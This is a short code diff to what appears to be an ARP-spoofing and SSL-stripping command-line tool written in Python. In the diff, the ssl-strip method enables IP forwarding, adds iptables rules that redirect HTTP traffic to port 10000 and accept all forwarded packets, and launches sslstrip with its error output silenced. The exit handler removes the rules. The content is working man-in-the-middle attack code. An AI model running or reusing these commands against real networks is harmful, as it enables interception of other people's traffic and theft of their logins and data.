@@ -105,8 +105,9 @@ class SpoofToolCLI(cmd.Cmd):
         """Turns on ssl stripping (using moxie ssl_strip). Run ARP First."""
         os.system("sudo sysctl -w net.ipv4.ip_forward=1")
         os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
+        os.system("sudo iptables -A FORWARD -j ACCEPT")
         global ssl_process
-        ssl_process = subprocess.Popen("sudo python sslstrip-package/sslstrip.py", shell=True)
+        ssl_process = subprocess.Popen("sudo python sslstrip-package/sslstrip.py", shell=True, stderr=subprocess.DEVNULL)
         return
 
 
@@ -181,6 +182,7 @@ def exit_handler():
             ssl_process.terminate()
 
         os.system("sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
+        os.system("sudo iptables -D FORWARD -j ACCEPT")
         exit()
 
 if __name__ == '__main__':
